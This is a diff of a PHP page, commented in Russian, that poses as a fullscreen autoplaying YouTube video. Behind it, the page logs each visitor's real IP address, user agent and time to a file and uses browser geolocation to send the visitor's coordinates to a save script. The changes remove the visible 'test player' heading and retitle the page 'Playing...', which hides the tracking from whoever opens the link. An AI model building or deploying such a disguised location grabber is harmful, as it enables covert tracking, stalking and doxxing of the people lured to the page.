@@ -1,17 +1,38 @@
 <?php
 // index.php
-// 1. Сбор серверных конфигурационных данных и заголовков
-$ip = $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
+session_start();
+
+// Функция продвинутого определения реального IP пользователя
+function getRealIP() {
+    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
+    foreach ($ip_keys as $key) {
+        if (!empty($_SERVER[$key])) {
+            foreach (explode(',', $_SERVER[$key]) as $ip) {
+                $ip = trim($ip);
+                // Валидация IP-адреса
+                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+                    return $ip;
+                }
+            }
+            // Если IP прошел валидацию, но он локальный/приватный
+            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
+                return $_SERVER[$key];
+            }
+        }
+    }
+    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
+}
+
+$ip = getRealIP();
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
 $request_time = date('Y-m-d H:i:s');
 $protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
 $port = $_SERVER['REMOTE_PORT'] ?? '';
 
-// 2. Генерация случайного видео для демонстрации (массив тестовых ID)
+// Массив тестовых ID видео
 $videos = ['dQw4w9WgXcQ', 'jNQXAC9IVRw', '9bZkp7q19f0'];
 $random_video = $videos[array_rand($videos)];
 
-// 3. Формирование базовой записи (без координат)
 $log_entry = [
     'id' => uniqid(),
     'time' => $request_time,
@@ -23,11 +44,8 @@ $log_entry = [
     'lon' => 'Доступ отклонен или ожидается'
 ];
 
-// Сохраняем первичный лог в сессию, чтобы связать его с координатами из JS
-session_start();
 $_SESSION['current_log_id'] = $log_entry['id'];
 
-// Записываем первичную структуру в файл logs.json
 $file = 'logs.json';
 $current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
 if (!is_array($current_data)) $current_data = [];
@@ -39,74 +57,51 @@ file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSO
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Просмотр видеоматериала</title>
+    <title>Воспроизведение...</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0e1217;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        /* Стили для создания абсолютно полноэкранного плеера без рамок */
+        html, body {
             margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .container {
+            padding: 0;
             width: 100%;
-            max-width: 800px;
-            text-align: center;
-        }
-        .video-wrapper {
-            position: relative;
-            padding-bottom: 56.25%; /* Пропорции 16:9 для адаптивности */
-            height: 0;
+            height: 100%;
+            background-color: #000;
             overflow: hidden;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            background: #000;
         }
-        .video-wrapper iframe {
+        .fullscreen-video {
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            border: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
         }
-        h2 { font-weight: 400; margin-bottom: 20px; color: #a0aec0; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Тестовый плеер (Анализ сетевой доступности)</h2>
-    <div class="video-wrapper">
-        <iframe 
-            src="https://www.youtube.com/embed/<?php echo $random_video; ?>" 
-            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
-            allowfullscreen>
-        </iframe>
-    </div>
-</div>
+<!-- Видео разворачивается автоматически на весь экран за счет CSS параметров -->
+<iframe 
+    class="fullscreen-video"
+    src="https://www.youtube.com/embed/<?php echo $random_video; ?>?autoplay=1&rel=0&showinfo=0&controls=1" 
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+    allowfullscreen>
+</iframe>
 
 <script>
-// Запрос геокоординат через легитимный Браузерный API
+// Легитимный запрос координат устройства средствами браузера
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(function(position) {
-        // Формируем данные для отправки
         const data = new FormData();
         data.append('lat', position.coords.latitude);
         data.append('lon', position.coords.longitude);
 
-        // Отправляем асинхронный запрос на сервер
         fetch('save.php', {
             method: 'POST',
             body: data
         });
     }, function(error) {
-        console.log("Доступ к геопозиции не предоставлен пользователем.");
+        console.log("Доступ к геопозиции не предоставлен устройством.");
     });
 }
 </script>
